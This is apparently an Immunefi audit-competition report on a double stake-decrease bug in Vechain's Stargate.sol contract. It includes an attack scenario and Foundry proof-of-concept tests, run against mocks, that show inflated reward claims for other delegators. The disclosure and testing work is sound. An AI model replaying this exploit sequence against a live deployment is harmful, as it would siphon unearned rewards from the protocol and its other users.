# 60470 sc high double decrease of validator stake in stargate sol

**Submitted on Nov 23rd 2025 at 04:40:04 UTC by @FrontRunner for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60470
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

A specific sequence of actions can cause a user's delegated stake to be subtracted twice from the validator's total. This artificially deflates the validator's stake, leading to inflated reward calculations for all remaining delegators of that validator. This constitutes a value leak from the protocol's reward pool, as it allows other users to claim more rewards than they are entitled to.

## Vulnerability Details

The core of the vulnerability lies in the redundant stake-decreasing logic present in two separate functions: `requestDelegationExit` and `unstake`.

`requestDelegationExit()`: When a user signals their intent to stop delegating, this function correctly calls `_updatePeriodEffectiveStake(..., false)` to schedule a decrease in the validator's total effective stake for a future period.

`unstake()`: This function contains a conditional block that also calls `_updatePeriodEffectiveStake(..., false)` if the validator's status is `EXITED` or if the user's delegation status was `PENDING`.

The flaw is triggered when both conditions are met for the same delegation. If a user calls requestDelegationExit and, before they call unstake, the validator itself also exits, the logic in unstake does not account for the fact that the stake decrease has already been processed. This results in the same stake being subtracted from the validator's total for a second time.

#### Attack Scenario

1. A user has an `ACTIVE` delegation to an `ACTIVE` validator.
2. The user calls `requestDelegationExit(tokenId)`. The Stargate contract correctly schedules a decrease in the validator's effective stake.
3. The validator's status changes to `VALIDATOR_STATUS_EXITED` due to external circumstances before the user unstakes.
4. The user calls `unstake(tokenId)`. The delegation status is `EXITED` (because the exit period has passed). The validator status is `VALIDATOR_STATUS_EXITED`. The condition `if (currentValidatorStatus == VALIDATOR_STATUS_EXITED || delegation.status == DelegationStatus.PENDING)` evaluates to true. `_updatePeriodEffectiveStake(..., false)` is called again for the same stake, causing an arithmetic underflow when calculating the validator's new total stake.

```solidity
function unstake(uint256 _tokenId) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
    // ... (checks and initial logic)

    // get the current validator status
    (, , , , uint8 currentValidatorStatus, ) = $.protocolStakerContract.getValidation(
        delegation.validator
    );
    // if the delegation is pending or the validator is exited or unknown
    // decrease the effective stake of the previous validator
    if (
        currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
        delegation.status == DelegationStatus.PENDING
    ) {
        // ...
        // VULNERABILITY: This call is redundant if requestDelegationExit was already called.
        _updatePeriodEffectiveStake(
            $,
            delegation.validator,
            _tokenId,
            oldCompletedPeriods + 2,
            false // decrease
        );
    }

    // ... (rest of the function)
}
```

The if condition does not check if requestDelegationExit has already been successfully called and processed the stake decrease. When the validator has exited, this block is executed unconditionally, leading to the double-decrease bug.

## Impact Details

The double-subtraction of stake artificially deflates the validator's `delegatorsEffectiveStake`. When rewards are calculated for the remaining delegators, their share of the total rewards is determined by their stake relative to this deflated total. Remaining delegators receive a proportionally larger share of the rewards for that period.

## References

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L231>

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L523>

## Proof of Concept

## Proof of Concept

```solidity

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import { Stargate } from "../src/Stargate.sol";
import { ProtocolStakerMock } from "../src/mocks/ProtocolStakerMock.sol";
import { StargateNFTMock } from "../src/mocks/StargateNFTMock.sol";
import { IStargate } from "../src/interfaces/IStargate.sol";
import { DataTypes } from "../src/StargateNFT/libraries/DataTypes.sol";
import { MockVTHO } from "./MockVTHO.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import { stdError } from "forge-std/Test.sol";

contract VulnerabilityPOCTest is Test {
    Stargate stargate;
    ProtocolStakerMock protocolStakerMock;
    StargateNFTMock stargateNFTMock;

    address internal attacker = address(1);
    address internal validator = address(2);
    address internal benignUser1 = address(3);
    address internal benignUser2 = address(4);

    uint256 internal constant STAKE_AMOUNT = 1000e18;
    uint8 internal constant LEVEL_ID = 1;
    uint256 internal constant PERIOD_REWARDS = 0.1e18;

    function setUp() public {
        protocolStakerMock = new ProtocolStakerMock();
        stargateNFTMock = new StargateNFTMock();

        Stargate stargateImpl = new Stargate();
        
        bytes memory data = abi.encodeWithSelector(
            Stargate.initialize.selector,
            Stargate.InitializeV1Params({
                admin: address(this),
                protocolStakerContract: address(protocolStakerMock),
                stargateNFTContract: address(stargateNFTMock),
                maxClaimablePeriods: 832
            })
        );

        ERC1967Proxy proxy = new ERC1967Proxy(address(stargateImpl), data);
        stargate = Stargate(payable(address(proxy)));
        
        protocolStakerMock.helper__setStargate(address(stargate));
        
        stargateNFTMock.helper__setLevel(
            DataTypes.Level({
                id: LEVEL_ID,
                name: "TestLevel",
                isX: false,
                maturityBlocks: 0,
                scaledRewardFactor: 100,
                vetAmountRequiredToStake: STAKE_AMOUNT
            })
        );
        
        stargateNFTMock.helper__setToken(
            DataTypes.Token({
                tokenId: 0,
                levelId: LEVEL_ID,
                mintedAtBlock: uint64(block.number),
                vetAmountStaked: STAKE_AMOUNT,
                lastVetGeneratedVthoClaimTimestamp_deprecated: 0
            })
        );

        protocolStakerMock.addValidation(validator, 100);

        // Deploy MockVTHO and etch its code to the constant address
        MockVTHO mockVtho = new MockVTHO();
        address vthoAddress = address(stargate.VTHO_TOKEN());
        vm.etch(vthoAddress, address(mockVtho).code);
        
        // Fund the stargate contract with rewards by calling mint on the etched contract
        MockVTHO(vthoAddress).mint(address(stargate), 1_000_000e18);
    }

    function test_poc_arithmeticUnderflow() public {
        protocolStakerMock.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.ACTIVE);
        
        vm.deal(attacker, STAKE_AMOUNT);
        vm.prank(attacker);
        uint256 tokenId = stargate.stake{value: STAKE_AMOUNT}(LEVEL_ID);

        vm.prank(attacker);
        stargate.delegate(tokenId, validator);

        protocolStakerMock.helper__setValidationCompletedPeriods(validator, 2);
        
        IStargate.Delegation memory delegation = stargate.getDelegationDetails(tokenId);
        assertEq(uint(delegation.status), uint(IStargate.DelegationStatus.ACTIVE), "Delegation should be ACTIVE");
        
        vm.prank(attacker);
        stargate.requestDelegationExit(tokenId);

        protocolStakerMock.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.EXITED);

        protocolStakerMock.helper__setValidationCompletedPeriods(validator, 3);
        
        vm.expectRevert(stdError.arithmeticError);
        vm.prank(attacker);
        stargate.unstake(tokenId);
    }

    function test_poc_rewardInflation() public {
        // --- ARRANGE ---
        protocolStakerMock.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.ACTIVE);

        // 1. Setup three delegators
        vm.deal(attacker, STAKE_AMOUNT);
        vm.deal(benignUser1, STAKE_AMOUNT);
        vm.deal(benignUser2, STAKE_AMOUNT);

        vm.prank(attacker);
        uint256 attackerTokenId = stargate.stake{value: STAKE_AMOUNT}(LEVEL_ID);
        vm.prank(benignUser1);
        uint256 benignUser1TokenId = stargate.stake{value: STAKE_AMOUNT}(LEVEL_ID);
        vm.prank(benignUser2);
        uint256 benignUser2TokenId = stargate.stake{value: STAKE_AMOUNT}(LEVEL_ID);

        vm.prank(attacker);
        stargate.delegate(attackerTokenId, validator);
        vm.prank(benignUser1);
        stargate.delegate(benignUser1TokenId, validator);
        vm.prank(benignUser2);
        stargate.delegate(benignUser2TokenId, validator);

        // 2. Make all delegations ACTIVE
        protocolStakerMock.helper__setValidationCompletedPeriods(validator, 2);
        uint32 activePeriod = 3;
        
        uint256 initialTotalStake = stargate.getDelegatorsEffectiveStake(validator, activePeriod);
        assertEq(initialTotalStake, STAKE_AMOUNT * 3, "Initial total stake should be 3 * STAKE_AMOUNT");

        // --- ACT ---
        // 3. Attacker performs the exploit
        vm.prank(attacker);
        stargate.requestDelegationExit(attackerTokenId);

        protocolStakerMock.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.EXITED);
        
        protocolStakerMock.helper__setValidationCompletedPeriods(validator, activePeriod);
        
        vm.prank(attacker);
        stargate.unstake(attackerTokenId);

        // --- ASSERT ---
        uint32 rewardPeriod = activePeriod + 2; // Period 5, where the 2nd decrease takes effect

        // 4. Check that the total stake for the reward period is wrong
        uint256 vulnerableTotalStake = stargate.getDelegatorsEffectiveStake(validator, rewardPeriod);
        uint256 correctTotalStake = STAKE_AMOUNT * 2;
        
        assertEq(vulnerableTotalStake, STAKE_AMOUNT, "Vulnerable total stake should be STAKE_AMOUNT");
        assertNotEq(vulnerableTotalStake, correctTotalStake, "Vulnerable total stake should not equal correct total stake");

        // 5. Benign user claims rewards and receives an inflated amount
        protocolStakerMock.helper__setValidationCompletedPeriods(validator, rewardPeriod);
        protocolStakerMock.helper__setDelegatorsRewards(validator, rewardPeriod, PERIOD_REWARDS);

        uint256 correctReward = (STAKE_AMOUNT * PERIOD_REWARDS) / correctTotalStake;
        uint256 inflatedReward = (STAKE_AMOUNT * PERIOD_REWARDS) / vulnerableTotalStake;

        assertEq(correctReward, PERIOD_REWARDS / 2, "Correct reward should be half");
        assertEq(inflatedReward, PERIOD_REWARDS, "Inflated reward should be the full amount");

        IERC20 vtho = IERC20(address(stargate.VTHO_TOKEN()));
        uint256 balanceBefore = vtho.balanceOf(benignUser1);
        
        vm.prank(benignUser1);
        stargate.claimRewards(benignUser1TokenId);

        uint256 balanceAfter = vtho.balanceOf(benignUser1);
        uint256 rewardsClaimed = balanceAfter - balanceBefore;

        console.log("Correct Reward:", correctReward);
        console.log("Inflated Reward (Claimed):", rewardsClaimed);

        assertEq(rewardsClaimed, inflatedReward, "Benign user should have claimed inflated rewards");
        assertTrue(rewardsClaimed > correctReward, "Claimed rewards should be greater than correct rewards");
    }
}

```
